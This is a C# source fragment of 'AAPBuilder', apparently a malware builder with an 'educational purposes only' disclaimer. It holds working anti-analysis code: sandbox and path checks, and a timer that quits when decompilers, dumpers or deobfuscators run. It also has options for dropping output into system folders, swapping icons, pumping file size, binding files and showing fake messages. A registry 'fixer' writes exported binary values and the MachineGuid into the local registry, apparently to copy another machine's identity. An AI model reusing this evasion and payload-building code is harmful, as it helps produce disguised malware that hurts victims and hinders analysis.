                    if (basePath.Contains("C:\\FILE.EXE") || basePath.Contains("\\VIRUS") || (basePath.Contains("SANDBOX") || basePath.Contains("SAMPLE")) || (basePath.Contains("MALWARE") || basePath.Contains("DE4DOT")) || basePath.Contains("REVERSE") || (int)FindWindow("Afx:400000:0", (IntPtr)0) != 0) return true;
                }
                return false;
            }
            catch (Exception)
            {
                return true;
            }
        }

        private void ınfluenceButton3_Click(object sender, EventArgs e)
        {
            try
            {
                openFileDialog1.Filter = "Icon Files |*.ico";
                openFileDialog1.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                if (openFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    pictureBox1.Image = Bitmap.FromHicon(new Icon(openFileDialog1.FileName, new Size(64, 64)).Handle);
                    textBox22.Text = openFileDialog1.FileName;
                }
                else return;
            }
            catch (Exception err)
            {
                System.Windows.Forms.MessageBox.Show($"Some unexpected error(s) occured;\n{err.Message.ToString()}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            CheckForIllegalCrossThreadCalls = false;
            try
            {
                Registry.CurrentUser.CreateSubKey(@"SOFTWARE\AAPBuilder\DisclaimerApproval");
                if (!((Registry.CurrentUser.OpenSubKey(@"SOFTWARE\AAPBuilder\DisclaimerApproval", false) == null) && (Registry.CurrentUser.OpenSubKey(@"SOFTWARE\AAPBuilder\DisclaimerApproval", false) == null)))
                {
                    if (Registry.CurrentUser.OpenSubKey(@"SOFTWARE\AAPBuilder\DisclaimerApproval").GetValue("Accepted").ToString() == "True")
                    {
                        txtPreviewPath.Text = Path.Combine(rbTemp.Checked ? Path.GetTempPath() : (rbAppdata.Checked ? Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) : (rbSystem.Checked ? (Environment.Is64BitOperatingSystem ? Environment.GetFolderPath(Environment.SpecialFolder.SystemX86).Replace("WINDOWS", "Windows") : Environment.GetFolderPath(Environment.SpecialFolder.System).Replace("WINDOWS", "Windows")) : (rbProgramFiles.Checked ? Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) : Path.GetTempPath()))), textBox20.Text);
                    }
                    else
                    {
                        if (MessageBox.Show("This tool is for educational purposes only. From this moment, I am not taking any responsibility for your actions. Do you agree?", "Disclaimer - AAPBuilder", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                        {
                            Registry.CurrentUser.OpenSubKey(@"SOFTWARE\AAPBuilder\DisclaimerApproval", true).SetValue("Accepted", "True");
                        }
                        else Application.Exit();
                    }
                }
                else
                {
                    if (MessageBox.Show("This tool is for educational purposes only. From this moment, I am not taking any responsibility for your actions. Do you agree?", "Disclaimer - AAPBuilder", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                    {
                        Registry.CurrentUser.OpenSubKey(@"SOFTWARE\AAPBuilder\DisclaimerApproval", true).SetValue("Accepted", "True");
                    }
                    else Application.Exit();
                }
            }
            catch (Exception)
            {
                try
                {
                    if (MessageBox.Show("This tool is for educational purposes only. From this moment, I am not taking any responsibility for your actions. Do you agree?", "Disclaimer - AAPBuilder", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                    {
                        Registry.CurrentUser.OpenSubKey(@"SOFTWARE\AAPBuilder\DisclaimerApproval", true).SetValue("Accepted", "True");
                    }
                    else Application.Exit();
                }
                catch (Exception) { }
            }
        }

        private void SearchProcess(object sender, ElapsedEventArgs e)
        {
            foreach (Process process_get in Process.GetProcesses())
            {
                try
                {
                    if (process_get.ProcessName.ToLower().Contains("unpack") || process_get.ProcessName.ToLower().Contains("decompile") || process_get.ProcessName.ToLower().Contains("de4dot") || process_get.ProcessName.ToLower().Contains("spy") || process_get.ProcessName.ToLower().Contains("dump") || process_get.ProcessName.ToLower().Contains("deobfuscat")) Environment.Exit(0);
                }
                catch { }
            }
        }

        public static Task currentTask;
        public static Disclaimer disclaimerPanel = new Disclaimer();

        public static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = Convert.FromBase64String(base64EncodedData);
            return Encoding.UTF8.GetString(base64EncodedBytes);
        }

        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = Encoding.UTF8.GetBytes(plainText);
            return Convert.ToBase64String(plainTextBytes);
        }

        private void ınfluenceCheckBox2_CheckedChanged(object sender)
        {
            ınfluenceCheckBox3.Enabled = ınfluenceCheckBox2.Checked;
            textBox9.Enabled = ınfluenceCheckBox2.Checked;
            textBox20.Enabled = ınfluenceCheckBox2.Checked;
            txtPreviewPath.Enabled = ınfluenceCheckBox2.Checked;
            rbAppdata.Enabled = ınfluenceCheckBox2.Checked;
            rbProgramFiles.Enabled = ınfluenceCheckBox2.Checked;
            rbSystem.Enabled = ınfluenceCheckBox2.Checked;
            rbTemp.Enabled = ınfluenceCheckBox2.Checked;
        }

        private void ınfluenceCheckBox1_CheckedChanged(object sender)
        {
            rbError.Enabled = ınfluenceCheckBox1.Checked;
            rbInformation.Enabled = ınfluenceCheckBox1.Checked;
            rbQuestion.Enabled = ınfluenceCheckBox1.Checked;
            rbNone.Enabled = ınfluenceCheckBox1.Checked;
            rbWarning.Enabled = ınfluenceCheckBox1.Checked;
            textBox10.Enabled = ınfluenceCheckBox1.Checked;
            textBox11.Enabled = ınfluenceCheckBox1.Checked;
        }

        private void ınfluenceButton1_Click(object sender, EventArgs e)
        {
            try
            {
                openFileDialog1.Filter = "All Files |*";
                openFileDialog1.InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                if (openFileDialog1.ShowDialog() == DialogResult.OK)
                {
                    textBox21.Text = openFileDialog1.FileName;
                }
                else return;
            }
            catch (Exception err)
            {
                System.Windows.Forms.MessageBox.Show($"Some unexpected error(s) occured;\n{err.Message.ToString()}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void bunifuImageButton2_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void RefreshPreviewPath(object sender, EventArgs e)
        {
            txtPreviewPath.Text = Path.Combine(rbTemp.Checked ? Path.GetTempPath() : (rbAppdata.Checked ? Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) : (rbSystem.Checked ? (Environment.Is64BitOperatingSystem ? Environment.GetFolderPath(Environment.SpecialFolder.SystemX86).Replace("WINDOWS", "Windows") : Environment.GetFolderPath(Environment.SpecialFolder.System).Replace("WINDOWS", "Windows")) : (rbProgramFiles.Checked ? Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) : Path.GetTempPath()))), (textBox20.Text.EndsWith(".exe") || textBox20.Text.EndsWith(".EXE") ? textBox20.Text : textBox20.Text + ".exe"));
        }

        private void textBox22_TextChanged(object sender, EventArgs e)
        {
            try
            {
                if (File.Exists(textBox22.Text) && Path.GetExtension(textBox22.Text).ToLower() == ".ico") pictureBox1.Image = Bitmap.FromHicon(new Icon(textBox22.Text, new Size(64, 64)).Handle);
                else pictureBox1.Image = null;
            }
            catch (Exception err)
            {
                MessageBox.Show(err.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private ReceiverManager receiverManager = new ReceiverManager();
        private void ınfluenceButton2_Click(object sender, EventArgs e)
        {
            if (!receiverManager.Visible) receiverManager.ShowDialog();
            else receiverManager.BringToFront();
        }

        private void ınfluenceButton5_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }


        private void ınfluenceCheckBox13_CheckedChanged(object sender)
        {
            textBox12.Enabled = ınfluenceCheckBox13.Checked;
            textBox14.Enabled = ınfluenceCheckBox13.Checked;
            textBox15.Enabled = ınfluenceCheckBox13.Checked;
            textBox16.Enabled = ınfluenceCheckBox13.Checked;
            textBox17.Enabled = ınfluenceCheckBox13.Checked;
            textBox18.Enabled = ınfluenceCheckBox13.Checked;
            influenceNumericUpDown1.Enabled = ınfluenceCheckBox13.Checked;
            influenceNumericUpDown2.Enabled = ınfluenceCheckBox13.Checked;
            influenceNumericUpDown3.Enabled = ınfluenceCheckBox13.Checked;
            influenceNumericUpDown4.Enabled = ınfluenceCheckBox13.Checked;
            influenceNumericUpDown5.Enabled = ınfluenceCheckBox13.Checked;
            influenceNumericUpDown6.Enabled = ınfluenceCheckBox13.Checked;
            influenceNumericUpDown7.Enabled = ınfluenceCheckBox13.Checked;
            influenceNumericUpDown8.Enabled = ınfluenceCheckBox13.Checked;
        }

        private void RefreshPreviewPath(object sender)
        {
            txtPreviewPath.Text = Path.Combine(rbTemp.Checked ? Path.GetTempPath() : (rbAppdata.Checked ? Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) : (rbSystem.Checked ? (Environment.Is64BitOperatingSystem ? Environment.GetFolderPath(Environment.SpecialFolder.SystemX86).Replace("WINDOWS", "Windows") : Environment.GetFolderPath(Environment.SpecialFolder.System).Replace("WINDOWS", "Windows")) : (rbProgramFiles.Checked ? Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) : Path.GetTempPath()))), (textBox20.Text.EndsWith(".exe") || textBox20.Text.EndsWith(".EXE") ? textBox20.Text : textBox20.Text + ".exe"));
        }

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
        }

        private void textBox24_TextChanged(object sender, EventArgs e)
        {
            Regex regex = new Regex(@"^[0-9]+$");
            if (regex.IsMatch(textBox24.Text)) label13.BackColor = Color.Lime;
            else if (textBox24.Text == "") label13.BackColor = Color.Transparent;
            else label13.BackColor = Color.Red;
        }

        private void UpdateByteMaxAmount(object sender)
        {
            if (kbRb.Checked) textBox24.MaxLength = 7;
            else if (mbRb.Checked)
            {
                textBox24.MaxLength = 4;
                textBox24.Text = textBox24.Text.Length <= textBox24.MaxLength ? textBox24.Text : textBox24.Text.Substring(0, textBox24.MaxLength);
            }
        }

        private void textBox21_TextChanged(object sender, EventArgs e)
        {
            if (File.Exists(textBox21.Text))
            {
                if (Path.GetExtension(textBox21.Text).ToLower() != ".exe") bunifuiOSSwitch1.Value = false;
                else bunifuiOSSwitch1.Value = true;
            }
        }

        private void influenceCheckBox1_CheckedChanged(object sender)
        {
            kbRb.Enabled = influenceCheckBox1.Checked;
            mbRb.Enabled = influenceCheckBox1.Checked;
            textBox24.Enabled = influenceCheckBox1.Checked;
            ınfluenceCheckBox7.Enabled = influenceCheckBox1.Checked;
        }

        private void groupBox2_Enter(object sender, EventArgs e)
        {

        }

        private void influenceButton1_Click(object sender, EventArgs e)
        {
            openFileDialog1.Filter = "All Files |*";
            if (openFileDialog1.ShowDialog() == DialogResult.OK) textBox13.Text = openFileDialog1.FileName;
        }

        private void influenceButton2_Click(object sender, EventArgs e)
        {
            openFileDialog1.Filter = "Icon Files |*.ico";
            if (openFileDialog1.ShowDialog() == DialogResult.OK) textBox19.Text = openFileDialog1.FileName;
        }

        private void ınfluenceCheckBox7_CheckedChanged(object sender)
        {

        }

        private void txtPreviewPath_TextChanged(object sender, EventArgs e)
        {

        }

        private void influenceCheckBox3_CheckedChanged(object sender)
        {
            textBox19.Enabled = influenceCheckBox3.Checked;
            textBox13.Enabled = influenceCheckBox3.Checked;
            influenceButton1.Enabled = influenceCheckBox3.Checked;
            influenceButton2.Enabled = influenceCheckBox3.Checked;
        }

        private void tabPage1_Click(object sender, EventArgs e)
        {

        }

        private void pictureBox4_Click(object sender, EventArgs e)
        {
            Process.Start("https://www.youtube.com/channel/UCLMa2804Uu3gM4auGhYiBkw");
        }

        private void pictureBox3_Click(object sender, EventArgs e)
        {
            Process.Start("https://discord.gg/EdWKCrA");
        }

        private void bunifuThinButton21_Click_2(object sender, EventArgs e)
        {
            new Help().ShowDialog();
        }

        private void bunifuImageButton4_Click_2(object sender, EventArgs e)
        {
            new ChangeLog().Show();
        }

        private void RegFixerOutput_DragEnter(object sender, DragEventArgs e)
        {
            e.Effect = DragDropEffects.All;
        }

        private void RegFixerOutput_DragDrop(object sender, DragEventArgs e)
        {
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                string[] files = (string[])e.Data.GetData(DataFormats.FileDrop);
                if (File.Exists(files[0]))
                {
                    RegFixer regFixer = new RegFixer(RegFixerOutput);
                    regFixer.LoadRegistryFile(files[0]);
                }
            }
        }

        private void enterHex_Click(object sender, EventArgs e)
        {
            openFileDialog1.FileName = "";
            openFileDialog1.Filter = "Registry Export Files |*.reg";
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                if (File.Exists(openFileDialog1.FileName))
                {
                    RegFixer regFixer = new RegFixer(RegFixerOutput);
                    regFixer.LoadRegistryFile(openFileDialog1.FileName);
                }
            }
        }

        public bool FormDisposed = false;
        HexEditor hexEditor;
        private void influenceButton3_Click(object sender, EventArgs e)
        {
            if (FormDisposed) { hexEditor = new HexEditor(new RegFixer(RegFixerOutput), this); FormDisposed = false; }
            if (CheckOpened(hexEditor.Text)) { hexEditor.Show(); hexEditor.BringToFront(); }
            else hexEditor.Show();
        }

        private bool CheckOpened(string name)
        {
            foreach (Form frm in Application.OpenForms) if (frm.Text == name) return true;
            return false;
        }
    }

    public class RegFixer
    {
        public RegFixer(TextBox output)
        {
            RegFixerOutput = output;
        }

        TextBox RegFixerOutput = null;
        public void LoadRegistryFile(string path)
        {
            try
            {
                if (File.Exists(path))
                {
                    string[][] HexArray = new string[3][] { new string[2] { "", "" }, new string[4] { "", "", "", "" }, new string[1] { "" } };
                    WriteFixerOutput("Loading registry export file...");
                    RegFileObject regfile = new RegFileObject(path);
                    WriteFixerOutput("Parsing structures...");
                    foreach (KeyValuePair<String, Dictionary<String, RegValueObject>> entry in regfile.RegValues)
                    {
                        int ctr1 = 0, ctr2 = 0;
                        foreach (KeyValuePair<String, RegValueObject> item in entry.Value)
                        {
                            if (entry.Key.Contains(@"SOFTWARE\Microsoft\Cryptography")) HexArray[2][0] = item.Value.Value;
                            else if (entry.Key.Contains(@"Software\Microsoft"))
                            {
                                if (item.Value.Type == "REG_BINARY")
                                {
                                    HexArray[1][ctr2] = item.Value.Value;
                                    ctr2++;
                                }
                            }
                            else
                            {
                                if (item.Value.Type == "REG_BINARY")
                                {
                                    HexArray[0][ctr1] = item.Value.Value;
                                    ctr1++;
                                }
                            }
                        }
                    }
                    PatchHexValues(HexArray);
                }
                else
                {
                    WriteFixerOutput("File could not found! Try again...");
                    Thread.Sleep(2000);
                }
            }
            catch (Exception err)
            {
                WriteFixerOutput("Oops. Some unexpected error occured: " + err.Message);
            }
        }

        public void PatchHexValues(string[][] HexArray)
        {
            try
            {
                WriteFixerOutput("Scanning for valid key names...");
                string[] keyNames = ScankeyNames(Registry.CurrentUser), keyNames1 = ScankeyNames(Registry.CurrentUser.OpenSubKey("Software\\Microsoft"));

                RegistryKey guid = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SOFTWARE\\Microsoft\\Cryptography", RegistryKeyPermissionCheck.ReadWriteSubTree);
                RegistryKey guid2 = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\Cryptography", RegistryKeyPermissionCheck.ReadWriteSubTree);


                WriteFixerOutput("Patching bytes...");
                if (keyNames != null)
                {
                    foreach (string keyName in keyNames)
                    {
                        RegistryKey key = Registry.CurrentUser.OpenSubKey(keyName, true);
                        if (key != null)
                        {
                            string[] valueNames = key.GetValueNames();
                            for (int i = 0; i < valueNames.Length; i++)
                            {
                                if (!string.IsNullOrEmpty(HexArray[0][i]))
                                {
                                    if (ValidateHexString(HexArray[0][i].Replace(",", ""))) key.SetValue(valueNames[i], ConvertHexString(HexArray[0][i].Replace(",", "")));
                                    else
                                    {
                                        WriteFixerOutput(string.Format(@"Failed to convert '{0}' to byte array. (True format ex: f1,02,...)", HexArray[0][i]));
                                        break;
                                    }
                                }
                            }
                            key.Close();
                        }
                    }
                }

                if (keyNames1 != null)
                {
                    foreach (string keyName in keyNames1)
                    {
                        RegistryKey key = Registry.CurrentUser.OpenSubKey("Software\\Microsoft").OpenSubKey(keyName, true);
                        if (key != null)
                        {
                            string[] valueNames = key.GetValueNames();
                            for (int i = 0; i < valueNames.Length; i++)
                            {
                                if (!string.IsNullOrEmpty(HexArray[1][i]))
                                {
                                    if (ValidateHexString(HexArray[1][i].Replace(",", ""))) key.SetValue(valueNames[i], ConvertHexString(HexArray[1][i].Replace(",", "")));
                                    else
                                    {
                                        WriteFixerOutput(string.Format(@"Failed to convert '{0}' to byte array. (True format ex: f1,02,...)", HexArray[1][i]));
                                        break;
                                    }
                                }
                            }
                            key.Close();
                        }
                    }
                }

                if (!string.IsNullOrEmpty(HexArray[2][0]))
                {
                    if (guid != null) guid.SetValue("MachineGuid", HexArray[2][0]);
                    if (guid2 != null) guid2.SetValue("MachineGuid", HexArray[2][0]);
                }
                WriteFixerOutput("Done.");
            }
            catch (Exception err)
            {
                WriteFixerOutput("Oops. Some unexpected error occured: " + err.Message);
            }
        }

        public byte[] ConvertHexString(string hex)
        {
            return Enumerable.Range(0, hex.Length).Where(x => x % 2 == 0).Select(x => Convert.ToByte(hex.Substring(x, 2), 16)).ToArray();
        }

        public bool ValidateHexString(string hex)
        {
            try
            {
                Enumerable.Range(0, hex.Length).Where(x => x % 2 == 0).Select(x => Convert.ToByte(hex.Substring(x, 2), 16)).ToArray();
                return true;
            }
            catch (Exception)
            {
                return false;
            }
        }

        public string[] ScankeyNames(RegistryKey baseKey)
        {
            if (baseKey == null) return null;
            List<string> validSubKeyNameList = new List<string>();
            foreach (var keyName in baseKey.GetSubKeyNames())
            {
                int x;
                if (Int32.TryParse(keyName, out x)) validSubKeyNameList.Add(keyName);
            }
            return validSubKeyNameList.ToArray();
        }

        private void WriteFixerOutput(string text)
        {
            if (RegFixerOutput != null) RegFixerOutput.AppendText(text + Environment.NewLine);
        }
    }

    public class Randomizer
    {
        public static string RandomString(int length, bool onlyNumber)
        {
            string chars;
            if (onlyNumber) chars = "0123456789";
            else chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            Random random = new Random(Guid.NewGuid().GetHashCode());
            return new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
        }

        public static string RandomString(int length, string[] names)
        {
            string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            string randomized = null;
            while (!CheckStartsWithInt(randomized) || !CheckExists(randomized, names))
            {
                Random random = new Random(Guid.NewGuid().GetHashCode());
                randomized = new string(Enumerable.Repeat(chars, length).Select(s => s[random.Next(s.Length)]).ToArray());
            }
            return randomized;
        }

        public static bool CheckExists(string text, string[] names)
        {
            if (text == null) return false;
            foreach (var item in names)
            {
                if (text.Contains(item)) return false;
            }
            return true;
        }

        public static bool CheckStartsWithInt(string text)
        {
            if (text == null) return false;
            for (int i = 0; i <= 9; i++)
            {
                if (text[0].ToString() == i.ToString()) return false;
            }
            return true;
        }
    }
}